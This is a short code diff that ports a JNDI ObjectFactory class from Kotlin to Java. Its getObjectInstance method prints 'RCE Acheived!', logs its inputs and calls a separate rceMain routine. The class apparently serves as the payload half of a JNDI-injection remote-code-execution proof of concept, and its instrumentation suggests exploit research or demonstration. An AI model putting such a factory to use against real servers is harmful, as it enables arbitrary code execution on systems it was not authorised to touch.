@@ -8,36 +8,36 @@
 // remote code execution.
 
 
-import javax.naming.spi.ObjectFactory
+import javax.naming.spi.ObjectFactory;
 
-import java.util.Hashtable
+import java.util.Hashtable;
+import javax.naming.Name;
+import javax.naming.Context;
 
-import javax.naming.Name
-import javax.naming.Context
 
-
-class FactoryClass: ObjectFactory {
-    override fun getObjectInstance(
-        obj: Any?,
-        name: Name,
-        nameCtx: Context,
-        env: Hashtable<*,*>
-    ): MadeClass {
+class FactoryClass implements ObjectFactory {
+    @Override
+    public MadeClass getObjectInstance(
+        Object obj,
+        Name name,
+        Context nameCtx,
+        Hashtable<?,?> env
+    ) {
 
         // Add instrumentation
-        println("RCE Acheived!")
-        println("    obj:     " + obj.toString())
-        println("    name:    " + name.toString())
-        println("    nameCtx: " + nameCtx.toString())
-        println("    env:     " + env.toString())
+        System.out.println("RCE Acheived!");
+        System.out.println("    obj:     " + obj    );
+        System.out.println("    name:    " + name   );
+        System.out.println("    nameCtx: " + nameCtx);
+        System.out.println("    env:     " + env    );
 
         // Do whatever we want
-        rceMain()
+        RCEMain.rceMain();
 
         // We could choose not to return
         // However, the caller is expecting an object of type MadeClass. I
         //  choose to give them something. It might be useful for further
         //  instrumentation.
-        return MadeClass()
+        return new MadeClass();
     }
 }
